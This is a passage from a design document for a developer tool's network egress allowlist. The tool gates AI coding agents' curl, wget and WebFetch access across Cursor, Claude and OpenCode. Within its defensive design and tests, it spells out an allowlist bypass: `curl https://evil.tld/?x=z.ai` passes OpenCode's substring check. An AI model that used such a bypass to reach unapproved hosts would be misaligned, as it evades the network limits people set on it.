**Gained by the derivation gate, sacrificed vs pure derivation:** two small denylists must be maintained and will eventually go stale for a novel PaaS apex (`*.modal.run`, `*.fly.dev`). In exchange the `groq -> nvidia.com` copy-paste class and the `*.googleapis.com` over-grant class both fail the build instead of shipping. The gate is a **deny**, so an unknown platform apex passes — accepted knowingly, with the invariant stated in one sentence in the registry file so the next maintainer sees it.

**Gained by deleting the hook's fallback, sacrificed vs codegen:** a consumer who deletes or gitignores `.cursor/allowlist.json` gets an ask on every outbound `curl`/`wget`, including `github.com` — noisy, and it reads like "bkit is broken" to a new contributor until they run `bkit install`. In exchange there is nothing left to keep in sync, the hook needs no edit when a provider is added, and the degraded state is fail-safe rather than fail-open.

**Gained by emptying the `settings.json` WebFetch seed, sacrificed:** the shipped template no longer self-documents which hosts bkit grants — a reader must run an install or read `.bkit/providers.md`. In exchange the fourth hand-maintained copy is gone rather than test-guarded, and it stops being a silently-stale partial subset.

**Gained by the prune, sacrificed:** a consumer who hand-added a domain that later also appears in the derived set will see it recorded as bkit-written and pruned if it leaves the set. Accepted: the alternative (never recording, never pruning) is the status quo the issue exists to fix, and the failure mode is a re-declarable grant rather than data loss. This paragraph is the _only_ honest statement of the prune's guarantee, and § 3 now matches it — the v1 draft asserted elsewhere that the removal set "provably cannot delete a consumer's hand-added grant", which contradicted this paragraph directly. The residual case is bounded on both ends: bkit must have recorded the string on a prior run (so a grant it never wrote is untouchable), and the removal is disclosed at the time via `.bkit/advisories.md` and permanently via `git diff .claude/settings.json`.

**Gained by recording `webFetchDerived` in `.bkit/version`, sacrificed:** the file now holds the consumer's own `allowed-domains` entries alongside bkit's, because the recorded set is `resolveNetworkAllowlist(cwd)`. Accepted, and not the contradiction it looks like: `.bkit/version` is already consumer-varying (`canonicalHashes` keys are per-consumer paths) and is excluded from the published package, so the "no consumer content in bkit-owned artifacts" rule this design defends — which is about the byte-equal-hash-gated `guardrails.cjs` — is untouched. Recording only bkit's own subset would break Success Criterion 4, since a consumer-declared domain leaving `allowed-domains` is exactly the removal the criterion requires.

**Gained by widening the base list, sacrificed:** every added base is one more `endsWith("." + base)` a lookalike host can aim at in the Cursor hook, and one more substring `curl *{base}*` glob on OpenCode where a query param defeats the check. Accepted because the hosts added are ones bkit already configures agents to call; the OpenCode weakness is documented rather than implied.

## Risks & Open Questions

### Risks

<!-- prettier-ignore -->
| Risk | Severity | Mitigation |
| --- | --- | --- |
| **The cloud allowlist is human-mediated and no surface can detect a stale paste.** Symptom is an opaque harness timeout on the model call, not a network error. | HIGH | Three-part, and the third part is what round-1 review found missing: (1) static list, so it rarely changes; (2) fingerprint rendered as prose after the paste fence, hashed over the derived set only; (3) **a symptom-first troubleshooting sentence in both `cloud.md` templates** telling the operator that a hanging model call means "check the allowlist, re-render, diff the fingerprint, re-paste", plus the triage-side note in `.bkit/providers.md`. Without (3) the fingerprint is inert. Residual: no automatic comparison exists; bootstrap-time reachability probe deferred. |
| **A grant removal goes unnoticed.** `bkit upgrade` / `install` stdout scrolls away; a consumer discovers a narrowed grant days later with no record of what happened. | MEDIUM | Advisory `webfetch-grants-pruned` into `.bkit/advisories.md` on install/check (existing `writeAdvisoriesArtifact` channel), naming the exact removed strings and the re-declare path; plus `git diff .claude/settings.json`, which is durable and version-controlled on every path. Residual, stated: `bkit upgrade` does not write the advisories artifact today, so on upgrade only stdout + `git diff` apply. |
| **A future `.bkit/version` field addition re-breaks provenance the same way.** The install-side writer is a fresh object literal, so any new field must be threaded into it explicitly or it is silently dropped. | MEDIUM | Test 10 asserts `webFetchDerived` survives a real tmp-dir install. The install/upgrade writer asymmetry (fresh literal vs spread) is now recorded in the ground-truth table so the next field author sees it before, not after. |
| **`bkit check` drift from a missed `.bkit/version` regeneration.** The hook and both template files change; forgetting to regenerate ships a drift to every consumer. | HIGH | `bkit install` regenerates; test 6 (hook byte parity) plus a clean `bkit check` on the dogfood install is a release gate. Memory note: `bkit install` flips `core.bare=true` — reset after. |
| **Moving `OPENCODE_PROVIDER_DEFAULTS` touches a heavily-tested file.** 5 in-file call sites plus `renderOpencodeJson` fixtures. | MEDIUM | Symbol is module-private, so the move is a relocation plus one import; no external call site or test import changes. Verified via grep — the only non-`bkit-modules.ts` hits are comments and `dist/`. |
| **Unit-lane coverage accounting.** `package.json:47` gates `branches=70` over a literal file list; new branching in an unlisted file silently leaves the measured set. | MEDIUM | Leaf module carries data only; all branching (derivation, gate, prune diff) stays in `bkit-cloud-env.ts`, already in the list. |
| **Stale slop-scan `_reason` prose.** `slop-scan.config.json:175` justifies the empty catch as "fail-OPEN … the shipped fallback is correct behaviour" — false after this. | LOW | Rewrite the `_reason` in the same commit. Adding a new `try`/`catch` anywhere in this change would fail `slop:delta` on net score — use `URL.canParse`. |
| **Denylist rot.** A future AI vendor on `*.modal.run` / `*.fly.dev` collapses to a platform apex the gate does not know about. | MEDIUM | Accept the deny-shaped gate; add a soft warning (not a block) when a derived base sits on a `.dev` / `.app` / `.run` TLD, and state the invariant in one sentence in the registry file. |
| **The "why declaration beat PSL" reasoning is tribal.** The next maintainer adds `psl` "to do it properly" and re-widens everything. | MEDIUM | Record as an ADR row in `docs/decisions.jsonl` with the `*.googleapis.com` example verbatim, not only in a PR comment. |
| **Scale.** At ~10x providers the union is ~70 bases -> ~140 expanded entries -> ~280 keys in `opencode.json`'s bash map and a ~140-line dashboard paste block. | LOW | Not a perf concern (`curlWgetHostAllowed` stays sub-millisecond). Real limit is unmeasured dashboard field caps — see open questions. |

### Open questions

1. **Does an opencode built-in gateway session actually contact `models.dev`?** `.bkit/prompts.md:223-225` states catalogs are resolved from models.dev, which is why the row is declared — but this has not been confirmed against a live cloud run. Re-verified in review: `models.dev` appears only in code comments (`bkit-modules.ts:1405`, `:1480-1483`, `:2013`) and `.bkit/prompts.md`, never as a URL bkit itself issues. Omitting it breaks `opencode-zen`/`opencode-go` in cloud; including it is a low-risk two-label widening. **Included pending verification** — cheap to settle by running an `opencode-zen` session with the host blocked; low risk either way, and not a blocker for the plan.
2. **Are `console.anthropic.com` / `api.cursor.com` reachable-from-cloud requirements or docs-only hosts?** Their bases (`anthropic.com`, `cursor.com`) already ship, so this affects only the `hosts` list the Cursor cloud renderer emits verbatim.
3. **Is there a practical upper bound on the Claude-web / Cursor "Allowed domains" dashboard field?** Unmeasured. At ~19 bases the paste is ~38 lines, far from any plausible cap, so this is not a blocker now — but worth probing before the fan-out grows, since the paste block is the one surface with a human in the loop.
4. **Should `registry.npmjs.org` be the declared host for the `pkg-npm` row, or is `npmjs.com` alone sufficient?** The base covers both; the exact host only matters for the non-wildcarded Cursor cloud list.
5. **CLOSED — answered NO.** "Does emptying the `settings.json` template's `WebFetch` array break the opencode/claude gate-parity assertion in `bkit-modules.integration.test.ts`?" The v1 draft guessed "likely yes". It does not: repo-wide grep for `WebFetch(domain:` across `.bkit/src/*.test.ts` returns zero hits, the gate-parity assertion covers **bash** gates only, and `deepContains`'s array-subset semantics (`bkit-tiers.ts:69-71`) mean shrinking the template array can only relax containment. No re-anchoring, no plan-time investigation. Full reasoning in § 6.

### Deferrals to record (not solved here)

<!-- prettier-ignore -->
| Deferral | Why not in scope |
| --- | --- |
| **`bkit upgrade` does not write `.bkit/advisories.md`** | A general install/upgrade parity gap that pre-dates this issue and affects every advisory, not just the prune's. The prune does not depend on it — `git diff .claude/settings.json` is durable on every path. Fixing it here would widen the change into the upgrade branch's finalisation for no gain to this issue. |
| **WebFetch grants survive `bkit uninstall` once the template seed is emptied** | `.claude/settings.json` uninstall uses `stripTier2JsonScope` against the manifest template; with the seed empty, enrich-added grants are no longer template-scoped and are left behind. A real consequence of emptying the seed, but an uninstall-hygiene concern with its own shape. Recorded, not solved. |
| **Ask-rate signal in the Cursor hook** (round-1 operability OPTIONAL 3) | Suggested so a consumer with a degraded `.cursor/allowlist.json` has something concrete to paste into a bug report. **Skipped deliberately.** `guardrails.cjs` is `byte-equal-text` hash-gated and runs on every command in an editor session, so adding output there is new runtime behaviour in a shipped, drift-gated hook — a different change with its own review surface. The degraded state is already self-diagnosing via the ask message naming `.cursor/allowlist.json` + `bkit install`, which is the runbook half that matters most. Recorded so it is a decision, not an oversight. |
| **Bootstrap-time cloud reachability probe** | The only mechanism that structurally closes the human-transport gap, but it is a new cloud-session capability rather than a derivation change. Both reviews agree it is out of scope. |
| **A stricter OpenCode encoding than `curl *{base}*`** | Bounded by OpenCode's permission schema — no URL-host primitive exists to switch to. Documented in `.bkit/providers.md` rather than fixed. |
| **A unified runtime allowlist artifact read by all three IDE surfaces** | Blocked by Claude `permissions.allow` and OpenCode `permission.bash` requiring literal per-host strings. Recorded with the blocking reason so it is not re-proposed without re-discovering it. |

## Suggested Workstreams

Seams used: **module boundary** (new leaf `bkit-registry.ts` -> `bkit-cloud-env.ts` -> `bkit-modules.ts`, one direction only), **encoding-surface boundary** (the five surfaces are independently rendered and independently testable), and **chronological dependency** (nothing can render a derived set before the set exists; nothing can prune before provenance is recorded).

#394's two carried-forward items land in different workstreams and are tracked separately: `SHIPPED_NETWORK_BASES` hand-sync -> WS-4 (deleted outright), `enrichClaudeSettingsWebFetch` additive-only -> WS-5 (replaced by record-then-prune).

Doc edits are **not** a separate workstream. `.agents/rules.md` doctrine and Success Criterion 5 both require docs to change in the same commit as the code they describe, so every row of § 5 is assigned to the workstream that owns the corresponding code. `.bkit/providers.md` is therefore edited by three workstreams in three distinct sections (§ Network allowlist fallback line, the substring-glob note, the fingerprint triage note) — deliberate, and called out so a builder does not treat the second edit as a conflict.

### WS-1: Egress registry leaf module

#### Scope

- Create `.bkit/src/bkit-registry.ts` as a **pure-data, import-free, branch-free** leaf (Architecture § Target shape). Branch-free is load-bearing: `package.json:47` pins the unit-coverage lane to a literal brace list with `branches=70`, and a new file is not in it.
- Move `OPENCODE_PROVIDER_DEFAULTS` verbatim from `bkit-modules.ts:1397-1500` into the leaf; add the one import line back into `bkit-modules.ts`. Symbol is module-private with 5 in-file call sites (`:1508`, `:1518`, `:1642`, `:1965`), so this is a relocation, not an API change — no external call site or test import moves.
- Declare the `EgressSource` row type exactly as in Data Model: `id` (stable, unique, **atomic** — never composite), `kind` (`opencode-provider | tracker-mcp | agent-host | package-registry | skills | docs`), `hosts: readonly string[]`, `bases: readonly string[]` (a **list**, not a scalar), optional `reason` (required when `bases` is `[]` or overrides the derived default).
- Author `BKIT_EGRESS_SOURCES` — all 19 rows of the populated set, one row per atomic id, the 10 `opencode-provider` rows in registry-key order (`ollama-local`, `nvidia`, `groq`, `cerebras`, `openrouter`, `ollama`, `zai`, `moonshot`, `opencode-zen`, `opencode-go`) plus `mcp-github`, `mcp-linear`, `agent-claude`, `agent-cursor`, `agent-opencode`, `pkg-npm`, `pkg-github`, `skills-sh`, `kimi-docs`. `opencode-provider` rows derive from `OPENCODE_PROVIDER_DEFAULTS[key].baseURL` at module init; every other kind is declared.
- Carry the recorded `reason` on every `bases: []` / override row: `ollama-local` (loopback), both gateways (`baseURL` is `""`; endpoints resolved via models.dev), `kimi-docs` (docs host not derivable from `api.moonshot.ai`, #376). `kimi-docs` carries `hosts: ["kimi.com"]`, **never** `[]`.
- Hold the two gate denylists as data — `MULTI_LABEL_SUFFIXES` (`co.uk`, `com.au`, `com.cn`, `co.jp`, `com.br`, …) and `MULTI_TENANT_APEXES` (`amazonaws.com`, `googleapis.com`, `azure.com`, `azurewebsites.net`, `workers.dev`, `vercel.app`, `pages.dev`, `hf.space`, `run.app`, `appspot.com`, …) — plus the one-sentence invariant stating the gate is a **deny**, so an unknown platform apex passes (Trade-offs § derivation gate; Risks § denylist rot).
- Record the deliberate absences in-file so they are not "fixed" later: `DEP_UPDATERS` / `RENOVATE_RUNNERS` hosts (runner-side egress), the literal `"none"` member of `ISSUE_TRACKERS` / `DEP_UPDATERS` (sentinel, not a source), and `json.schemastore.org` (editor JSON language server, never an agent tool call).
- Build-lane obligation: the new file produces `dist/bkit-registry.js`, which must be built and committed in the same change or `pnpm check:dist` fails CI.
- Open questions landing on this table's data: OQ2 (`console.anthropic.com` / `api.cursor.com` — reachable-from-cloud or docs-only; affects only the `hosts` column), OQ4 (`registry.npmjs.org` vs `npmjs.com` for `pkg-npm`; the base covers both, the exact host matters only to the non-wildcarded Cursor list), OQ1 (`models.dev` — **included pending verification**, cheap to settle, not a blocker).

#### Requires

[]

#### Rationale

Every other workstream reads this table; nothing this workstream touches reads anything else. It is the only true root: the leaf imports nothing, and the `OPENCODE_PROVIDER_DEFAULTS` relocation is what makes the otherwise-fatal `bkit-modules.ts:59-65` -> `bkit-cloud-env.ts` cycle a non-issue. Keeping data here and logic out of here is the whole reason the coverage-lane accounting hazard never arises.

### WS-2: Derivation, gate, and derived exports

#### Scope

- Implement the **proposer** in `bkit-cloud-env.ts` (runtime, silent, never throws, never fails CI): `URL.canParse` first — **never** `try`/`catch`, because a new catch-with-default-return trips `defensive.error-obscuring` and fails `slop:delta` on net score; contribute nothing for `""` host, `localhost` / `*.localhost`, IP literal, or `< 2` labels; otherwise collapse to the last two labels.
- Implement `isIpLiteral(host)` as the two-shape detector the v1 draft left unspecified: bracketed hostname -> IPv6/IPv4-mapped; `/^\d{1,3}(\.\d{1,3}){3}$/` -> IPv4 (WHATWG already normalises `0x7f.1`, `2130706433`, `127.1` into a dotted quad before the test sees them). Both are **proposer** rejections, so `1.2.3.4` never ships the garbage base `3.4` and `[::1]` never turns into CI red.
- Implement the **gate** as a test-only bkit-repo check over candidates the proposer accepted: label-boundary suffix match (`base === host || host.endsWith("." + base)`), `>= 2` labels, not in `MULTI_LABEL_SUFFIXES`, not in `MULTI_TENANT_APEXES`. Gates are **deny checks, never rewriters** — failing means CI red at authoring time. A row may override `bases` (or declare `bases: []` with a `reason`) only when the gate rejects the default; all 10 current entries pass unchanged.
- Export the pure `deriveEgressEntries(rows)` so tests can drive fixture rows without `vi.mock` (this is what makes Test 5 shape (b) possible).
- Recompute `BKIT_SHIPPED_NETWORK_DOMAINS` as a sorted-unique flatMap of every row's `bases` — **same name, same `readonly string[]` type**, so `resolveNetworkAllowlist` and its four downstreams need no signature change. Add `BKIT_SHIPPED_NETWORK_HOSTS` as the sorted-unique flatMap of every row's `hosts` (consumer: the Cursor cloud renderer only).
- Leave `resolveNetworkAllowlist` (shipped ∪ consumer, apex + `*.`) untouched.
- Confirm no new slop-scan exemption is needed: the two cited exemptions at `slop-scan.config.json:155-163` / `:173-181` are **file-scoped**, so new functions in `bkit-cloud-env.ts` inherit the pass-through exemption.
- Tests owned here: **1 Completeness** (one row per `OPENCODE_PROVIDER_DEFAULTS` key, table-driven over `Object.keys`; every row has non-empty `bases` **or** a `reason`; every row with non-empty `bases` has non-empty `hosts` — the invariant that stops the v1 `kimi-docs` Cursor-narrowing shape recurring; every `id` unique; `ISSUE_TRACKERS` / `DEP_UPDATERS` iterated with the literal `"none"` skipped **and the test asserting `"none"` was the only skip**). **2 Suffix invariant** (catches the `groq` inheriting `nvidia.com` copy-paste class that produced today's gaps). **3 Anti-widening** (no denylisted base, `>= 2` labels, no IP literal, no `localhost`).
- The two existing `BKIT_SHIPPED_NETWORK_DOMAINS` assertions (`bkit-cloud-env.test.ts:405-408`) are **negative** and survive the switch to a computed constant unchanged — keep them as the regression guard for it.
- Denylist-rot mitigation: emit a **soft warning, never a block**, when a derived base sits on a `.dev` / `.app` / `.run` TLD — the deny-shaped gate cannot know a future PaaS apex (`*.modal.run`, `*.fly.dev`), so the warning is what makes the unknown-platform case visible without failing the build on a legitimate vendor.

#### Requires

[WS-1]

#### Rationale

One place where all branching lives, and it is inside the coverage-measured file. Splitting proposer from gate is the round-1 review's central architectural correction (the two mechanisms have opposite failure modes: silent-omit vs CI-red), so they belong in the same workstream where the split can be asserted channel-by-channel rather than outcome-by-outcome. Everything downstream consumes the two derived exports, so this must complete before any surface changes.

### WS-3: Cloud paste surfaces — both renderers, fingerprint, operator runbook

#### Scope

- `renderCloudNetworkAllowlist`: switch from `expandAllowedDomains(extractAllowedDomains(cwd))` to `resolveNetworkAllowlist(cwd)` — the literal #381 defect (`bkit-cloud-env.ts:546-557` renders consumer-only today, so `--opencode=zai` is already broken in Claude-web even though `z.ai` is in the shipped constant).
- Retire the Claude `declared.length === 0` "Trusted default" branch: Trusted covers package registries and GitHub, not `api.z.ai`, so a zero-declaration consumer still needs Custom. Replace with a Custom block carrying the bkit set plus the existing pointer prose.
- Retire the **Cursor** zero-declared branch in the same change (`bkit-cloud-env.ts:648-656`, "nothing extra is required here" becomes flatly false). `renderCursorNetworkAllowlist` unions `BKIT_SHIPPED_NETWORK_HOSTS` — exact hosts, **no `*.` expansion** — with the consumer's declared entries verbatim, preserving Cursor's deliberate no-wildcard policy. Both renderers end up single-branch.
- Fingerprint: 8-hex, computed with the `sha256` already exported from `bkit-version.ts:190` (cycle-free; no second hasher, no `node:crypto` import), hashed over the **derived set only, never the consumer union** — so it changes at bkit-release cadence rather than on every `allowed-domains` edit. Rendered as prose appended to the italic line that **follows the closing fence** in both renderers; nothing inside the ` ```text ` fence changes, because the fence content is pasted verbatim into a vendor "Allowed domains" field.
- Docs in the same commit: `.bkit/templates/.claude/cloud.md` § 2 + § 5 and `.bkit/templates/.cursor/cloud.md` § 4 + § 5 gain the **symptom-first** runbook sentence ("if a cloud session's model calls hang or time out with no network error … compare the fingerprint … re-paste"). `.bkit/cloud.md:109-111` loses the "no `allowed-domains` -> Trusted is enough" guidance. `.agents/config.md:111-118` **and** `.bkit/templates/.agents/config.md:113-118` state that provider/tooling hosts are derived and must not be re-declared. `.bkit/providers.md` gains the triage-side note (ask a "cloud agent can't reach host X" reporter for the fingerprint). ASCII operators only in `.bkit/*.md`.
- Tests owned here: **9 Fingerprint placement** (token appears after the closing fence in both `.claude/cloud.md` and `.cursor/cloud.md`, never between the fences; editing `allowed-domains` does not change it, changing the registry does). Plus the § 5b existing-test repairs: `bkit-cloud-env.test.ts:326-330` and `:399-403` re-anchored off `"Set to **Trusted** (default)"` onto the always-Custom block (keep the pointer-prose assertion), and a plan-time sweep for any Cursor "nothing extra is required here" assertion.

#### Requires

[WS-2]

#### Rationale

The two cloud renderers are one surface with two vendor dialects: they share the zero-declared retirement, the fingerprint mechanism, and the operator runbook, and splitting them is exactly the asymmetry round-1 review caught in v1. Both `cloud.md` outputs are gitignored and untracked, so this workstream touches no manifest, no `canonicalHashes` and no hash gate — it can land and be verified independently of every other surface. The fingerprint plus its runbook sentence ship together because a fingerprint with no instruction to compare it is inert (Risks, HIGH).

### WS-4: Cursor hook — delete the duplicate list

#### Scope

- Remove `SHIPPED_NETWORK_BASES` (`guardrails.cjs:109-124`) from **both** `.cursor/hooks/guardrails.cjs` and `.bkit/templates/.cursor/hooks/guardrails.cjs`, together with its `keep in sync with …` comment.
- `loadNetworkAllowlistBases()` starts from an empty `Set` and reads `.cursor/allowlist.json` alone. Empty set -> `curlWgetHostAllowed` false for any parseable URL -> **ask**, the fail-safe direction #394 established.
- The ask message names `.cursor/allowlist.json` and `bkit install`, so the degraded state is self-diagnosing without a fallback list.
- Rely on the verified same-pass guarantee rather than adding one: `runCursorModule` writes the hook at `bkit-modules.ts:1272-1281` and the artifact at `:1332-1341`; upgrade writes the artifact under the same `renderModules.has("cursor")` gate at `bkit-install.ts:2595-2604`.
- Rewrite the now-false `_reason` at `slop-scan.config.json:175` in the same commit — the exemption stays, but its justification changes from "fail-OPEN … the shipped fallback is correct behaviour" to "must not crash the session; a corrupt artifact degrades to ask".
- Docs in the same commit: `.bkit/providers.md:260-275` line 273 ("Missing file ⇒ guardrails falls back to tooling defaults embedded in the hook") becomes "missing file ⇒ ask on every `curl`/`wget`; re-run `bkit install`".
- No two-entry safety floor (`github.com` + `npmjs.com`): two entries is still a hand-maintained list, and the case it guards cannot occur because the hook only exists if `bkit install` wrote it in the pass that wrote the artifact.
- Tests owned here: **6 Hook byte parity** (`.bkit/templates/.cursor/hooks/guardrails.cjs` byte-equal to `.cursor/hooks/guardrails.cjs` — the two are byte-identical today, so this lands as a pure regression guard) plus the hook half of the negative case (`curl https://evil.tld/?x=z.ai` still asks).

#### Requires

[WS-2]

#### Rationale

`guardrails.cjs` is the one **byte-equal-text** hash-gated artifact in the change (`bkit-manifest.ts:267`, force-overwritten by `writeTier1`), so it is the highest-blast-radius edit and the one whose correctness argument (same-pass artifact write, empty set degrades to ask) is entirely self-contained. It consumes the widened set only indirectly, through `.cursor/allowlist.json`, so it needs the derived exports but nothing else — and it must not be entangled with the Claude/provenance work, whose failure modes are unrelated.

### WS-5: Claude `WebFetch` — provenance record, sole writer, and prune

#### Scope

- **`.bkit/version` field.** Add `webFetchDerived: string[]` as a **required** property with a parser default of `[]` — mirroring `canonicalHashes` exactly (`bkit-version.ts:37-65`, `:88-104`), not as an optional field. Three construction sites gain it: `bkit-modules.ts:924-928` and the two `parseBkitVersion` returns at `bkit-version.ts:104` / `:110`. The `{ ...bkitVersion, … }` spreads in `bkit-upgrade.ts` are untouched; `tsconfig.json` excludes `**/*.test.ts`, so the ~48 test-side `tier3Hashes:` literals do not break typecheck. Old payloads parse to `[]` = "no record" = prune nothing.
- **Install write path.** `ModuleContext` gains `webFetchRecorded?: readonly string[] | null`. `enrichClaudeSettingsWebFetch` returns what it actually wrote; `runClaudeModule` assigns it at the `:1033` call site. Core's `postDispatch` literal resolves `ctx.webFetchRecorded ?? existingVersion?.webFetchDerived ?? []` — **carry-forward, never clobber-to-empty** — and `needsWrite` extends to `versionChanged || hasNewEntries || derivedChanged`. `.bkit/version` keeps exactly **one writer per path**; enrich never touches it. This is viable only because `ModuleContext` is a single shared object and `MODULE_DISPATCH_ORDER` runs `core` before `claude` while core's `postDispatch` runs after all modules return.
- **Upgrade write path.** `updateCanonicalHashesAfterUpgrade` gains `options.webFetchDerived?: readonly string[] | null`, fed from the enrich call at `bkit-install.ts:2610` and applied to the `updated` literal only when non-null. Its "nothing to persist" early return (`:474`) extends with `&& webFetchUnchanged`; its `dryRun` return (`:449`) gives the dry-run rule for free.
- **Dry-run rule (Success Criterion 3 by construction):** under `dryRun` enrich writes nothing, returns null, so the resolved value equals the existing one, `derivedChanged` is false, and no `ws.writes` entry is pushed for `.bkit/version`.
- **Sequencing inside this workstream:** the plan-time proof obligation runs **before** any prune code is written — seed `.bkit/version` in a tmp dir, run the real install, read the file back. If `webFetchDerived` does not survive, the prune sub-feature is re-scoped before the build, not during it.
- **Template seed emptied.** Remove the `WebFetch(domain:…)` block from `.bkit/templates/.claude/settings.json` (a stale partial subset — 7 of 13 bases carry only the `*.` form). `deepContains` uses array-**subset** semantics (`bkit-tiers.ts:69-71`), so shrinking it strictly relaxes containment and `bkit check` cannot regress.
- **Prune, in enrich.** `previous = webFetchDerived` (absent -> `[]`); `current = resolveNetworkAllowlist(cwd)` mapped to `WebFetch(domain:…)`; `add = current \ allow`; `remove = (previous \ current) ∩ allow`; write only when `add` or `remove` is non-empty; `record = current`, **returned** to the caller and never written here. Restructure — do not extend — the `if (missing.length === 0) return;` early return, or a steady-state install never records and the prune never fires.
- **Recording contract, one rule per path** (file absent / `JSON.parse` throws / `permissions.allow` not an array / `dryRun` -> **null**; `add` and `remove` both empty -> **`current`**; either non-empty -> **`current`**). Recording a claim on a non-writing path is strictly worse than the additive-only status quo.
- **The honest guarantee**, in both the plan and the code comment: the prune can only remove a grant bkit **recorded writing**; it **can** remove a hand-added grant that was also in the derived set at a previous recording moment, because `permissions.allow` carries no provenance. Never restate v1's false "provably cannot delete a consumer's hand-added grant".
- **Removal is recorded in three destinations:** console behind `LOG_PREFIX` on both paths; a `webfetch-grants-pruned` advisory (`severity: "advisory"`, exact removed strings in `detect`, re-declare path plus the `git diff` pointer in `action`) pushed onto `ctx.advisories` and flushed through `runPostInstallCheck` -> checklist banner + `writeAdvisoriesArtifact`; and `git diff .claude/settings.json`, which is git-tracked and durable on every path. Stated limitation: `bkit upgrade` does not write `.bkit/advisories.md` today, so on upgrade only destinations (1) and (3) apply.
- Docs in the same commit: `.bkit/workflows.md:1124` `WebFetch(domain:…)` permission-table row confirmed still correct after the seed is emptied; `.bkit/README.md:345` allowlist-encoding pointer wording verified.
- Tests owned here: **8 Prune round-trip** (record A, shrink to B, `A \ B` gone, hand-added grant survives, absent `webFetchDerived` prunes nothing; one case per recording-contract row — absent file / unparseable JSON / non-array `allow` / `dryRun` each leave the previous record **unchanged**, a steady-state no-op run **does** record, a removal emits the advisory) and **10 Provenance survives a real install** (seed, real tmp-dir install, read back — the test that would have caught v1's clobbered write path, and which must be a test rather than a one-off probe because the clobbering writer is a fresh literal any future field can re-break).
- Open question 5 is **closed, answered NO** — no `WebFetch(domain:` literal exists in any test file; the gate-parity assertion covers **bash** gates. No plan-time investigation.

#### Requires

[WS-2]

#### Rationale

The provenance field and the prune are one mechanism split across two files: the record is produced by enrich and consumed by the version writers, and neither half is observable or testable without the other. Separating them would create a workstream whose only deliverable is dead plumbing and a second whose prune reads a permanently empty record — precisely the v1 failure mode this design exists to correct. Success Criterion 4 (a dropped domain loses its grant; a hand-added grant is never removed unrecorded) is satisfiable only when both halves land together.

### WS-6: Cross-surface fan-out and the remaining encodings

#### Scope

- `injectOpencodeNetworkCurlAllows` (`bkit-modules.ts:1706-1714`) and the `.cursor/allowlist.json` writer (`bkit-cloud-env.ts:510-538`) are **unchanged code paths** — both already call `resolveNetworkAllowlist` and pick up the widened set for free. This workstream's job is to prove that, not to edit them.
- Doc consequence in the same commit: `.bkit/providers.md` states the OpenCode weakness explicitly — `curl *{base}*` is a **command substring** glob, so `curl https://evil.tld/?x=z.ai` is allowed on OpenCode even though the host-parsed Cursor hook rejects it, and widening the base list widens that asymmetry. Stated, never implied; the fix is a recorded deferral bounded by OpenCode's permission schema.
- Tests owned here (the ones no single surface can own): **4 Fan-out parity** — one derived union asserted present in **all five** surfaces after a tmp-dir install: cloud paste block, `.cursor/allowlist.json`, `.claude/settings.json` `WebFetch`, `.opencode/opencode.json` `curl`/`wget` globs, and — as an **absence** assertion — the hook carrying no domain array.
- **5 Injected-provider** — add a synthetic row and assert every surface changes. Shape is fixed at plan time, not left to the builder: preferred **(b)** drive the exported pure `deriveEgressEntries(rows)` with fixture rows and assert each surface's _renderer_ against the exported constant (no mock, branching stays in the coverage-measured file); acceptable fallback **(a)** a dedicated test file that mocks nothing else — because a hoisted `vi.mock("./bkit-registry.js")` inside `bkit-modules.integration.test.ts` would silently perturb every provider-rendering test in that file.
- **7 Negative/edge, asserting the channel and not merely the outcome** — `ollama-local` contributes nothing (no `localhost` anywhere); both gateway rows contribute `opencode.ai` + `models.dev` and never `""`; a malformed `baseURL` yields no row without throwing; `https://1.2.3.4:8080/v1` and `https://[::1]/v1` are **silent proposer** rejections; `https://api.pages.dev/v1` and `https://x.example.co.uk/v1` are **CI-red gate** rejections.
- Confirm Success Criterion 2's stronger half: no second domain list exists anywhere in the repo after WS-4 and WS-5 land, and CI fails if any of the five surfaces misses an entry.

#### Requires

[WS-3, WS-4, WS-5]

#### Rationale

These are the only tests that can fail when someone adds a surface without wiring it, and they are unwritable until every surface exists in its final shape — Test 4's absence assertion needs WS-4's deleted array, its `WebFetch` assertion needs WS-5's emptied template plus enrich, and its paste-block assertion needs WS-3's retired branches. Grouping them here also keeps the deliberately-unchanged OpenCode and `allowlist.json` paths from looking like an oversight: they are in scope as verification targets and as one documented weakness, with no code edit attached.

### WS-7: Release integration and decision records

#### Scope

- Build and commit `dist/bkit-registry.js` and every other changed `dist/` output; `pnpm check:dist` is the CI lane that fails otherwise.
- Success Criterion 3 as a release gate: `bkit check` reports **0 writes** on a clean install **and** a clean upgrade, for every module combination. Verify install and upgrade **live** (separate engines — `check` is not `upgrade`), on a dogfood install. Reset `git config core.bare false` afterwards, since `bkit install` flips it.
- Regenerate mirrors once at the end of the session, never per edit; confirm the hook, both `cloud.md` templates and the `settings.json` template are all re-rendered so no drift ships (Risks, HIGH: missed `.bkit/version` regeneration).
- Record the decision surface durably: an ADR row in `docs/decisions.jsonl` for "declaration-with-gate beat PSL", carrying the `*.googleapis.com` example **verbatim** — the reasoning is tribal otherwise and the next maintainer adds `psl` "to do it properly" and re-widens everything. Also record the static-vs-reactive choice (Conflict 1) and the hook-deletion choice (Conflict 3), with the rejected alternatives from § Approaches Considered so the two-tier hybrid and the unified runtime artifact are not re-proposed without re-discovering their blockers.
- Record all six deferrals in `docs/deferrals.jsonl`: `bkit upgrade` not writing `.bkit/advisories.md`; WebFetch grants surviving `bkit uninstall` once the seed is emptied; the deliberately-skipped ask-rate signal in the hook; the bootstrap-time cloud reachability probe; a stricter OpenCode encoding; a unified runtime allowlist artifact.
- Disposition the open questions rather than leaving them floating: OQ1 (`models.dev` — settle by running an `opencode-zen` session with the host blocked; included pending verification either way), OQ2 / OQ4 (feed back into WS-1's `hosts` column if they resolve before ship), OQ3 (dashboard "Allowed domains" field cap — unmeasured, ~38 lines today is far from any plausible cap, probe before the fan-out grows).
- Confirm Success Criterion 1 end-to-end: after one install and one dashboard paste, all six live gaps (`groq.com`, `cerebras.ai`, `openrouter.ai`, `githubcopilot.com`, `models.dev`, `skills.sh`) are reachable, and the paste block carries provider hosts even with zero declared `allowed-domains`.
- Add no new `try`/`catch` anywhere in the change — `slop:delta` fails on net score even at net-zero finding count.

#### Requires

[WS-6]

#### Rationale

The `dist/` commit, the clean-`check`-on-install-and-upgrade gate and the mirror regeneration are all whole-change properties that cannot be evaluated per surface — every one of them is only meaningful once all five encodings are final. The ledger writes belong at the end for the same reason: an ADR recorded mid-change records an intent, whereas one recorded here records what shipped, and the deferral list is not complete until the surfaces that generated the deferrals exist.
